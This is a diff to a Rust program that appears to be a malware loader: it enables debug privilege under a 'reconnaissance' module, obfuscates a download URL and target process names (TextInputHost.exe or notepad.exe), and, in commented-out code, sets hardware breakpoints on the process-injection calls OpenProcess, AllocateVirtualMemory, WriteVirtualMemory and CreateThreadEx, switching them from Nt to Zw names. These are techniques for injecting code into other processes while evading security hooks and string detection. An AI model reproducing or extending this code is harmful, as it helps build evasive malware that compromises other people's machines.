@@ -87,7 +87,7 @@ fn main() -> Result<(), anyhow::Error>{
 
     }
 
-    nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
+    nt_api::init_zw_api().expect("[ERROR] Failed to initialize ZW API!");
 
     let enabled_debug_privilege = match reconnaissance::enable_debug_privilege() {
         Ok(_) => {
@@ -105,12 +105,12 @@ fn main() -> Result<(), anyhow::Error>{
     let url = obfused_url.as_str();
 
 
-    if enabled_debug_privilege {
-        let obfused_process = obfuse!("TextInputHost.exe");
+    let obfused_process = if enabled_debug_privilege {
+        obfuse!("TextInputHost.exe")
     }
     else {
-        let obfused_process = obfuse!("notepad.exe");
-    }
+        obfuse!("notepad.exe")
+    };
 
 
     // let obfused_process = obfuse!("typora.exe");
@@ -151,20 +151,20 @@ fn main() -> Result<(), anyhow::Error>{
     // unsafe {
     //     let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");
 
-    //     let obfused_ntopenprocess = obfuse!("NtOpenProcess\0");
-    //     let obfused_ntallocatevirtualmemory = obfuse!("NtAllocateVirtualMemory\0");
-    //     let obfused_ntwritevirtualmemory = obfuse!("NtWriteVirtualMemory\0");
-    //     let obfused_ntcreatethreadex = obfuse!("NtCreateThreadEx\0");
+    //     let obfused_zwopenprocess = obfuse!("ZwOpenProcess\0");
+    //     let obfused_zwallocatevirtualmemory = obfuse!("ZwAllocateVirtualMemory\0");
+    //     let obfused_zwritevirtualmemory = obfuse!("ZwWriteVirtualMemory\0");
+    //     let obfused_zwcreatethreadex = obfuse!("ZwCreateThreadEx\0");
 
-    //     let obfused_str_ntopenprocess = obfused_ntopenprocess.as_str();
-    //     let obfused_str_ntallocatevirtualmemory = obfused_ntallocatevirtualmemory.as_str();
-    //     let obfused_str_ntwritevirtualmemory = obfused_ntwritevirtualmemory.as_str();
-    //     let obfused_str_ntcreatethreadex = obfused_ntcreatethreadex.as_str();
+    //     let obfused_str_zwopenprocess = obfused_zwopenprocess.as_str();
+    //     let obfused_str_zwallocatevirtualmemory = obfused_zwallocatevirtualmemory.as_str();
+    //     let obfused_str_zwritevirtualmemory = obfused_zwritevirtualmemory.as_str();
+    //     let obfused_str_zwcreatethreadex = obfused_zwcreatethreadex.as_str();
 
-    //     let _ = hwbp::set_hwbp(&dr0, obfused_str_ntopenprocess).expect("[ERROR] dr0");
-    //     let _ = hwbp::set_hwbp(&dr1, obfused_str_ntallocatevirtualmemory).expect("[ERROR] dr1");
-    //     let _ = hwbp::set_hwbp(&dr2, obfused_str_ntwritevirtualmemory).expect("[ERROR] dr2");
-    //     let _ = hwbp::set_hwbp(&dr3, obfused_str_ntcreatethreadex).expect("[ERROR] dr3");
+    //     let _ = hwbp::set_hwbp(&dr0, obfused_str_zwopenprocess).expect("[ERROR] dr0");
+    //     let _ = hwbp::set_hwbp(&dr1, obfused_str_zwallocatevirtualmemory).expect("[ERROR] dr1");
+    //     let _ = hwbp::set_hwbp(&dr2, obfused_str_zwritevirtualmemory).expect("[ERROR] dr2");
+    //     let _ = hwbp::set_hwbp(&dr3, obfused_str_zwcreatethreadex).expect("[ERROR] dr3");
 
     // }
 
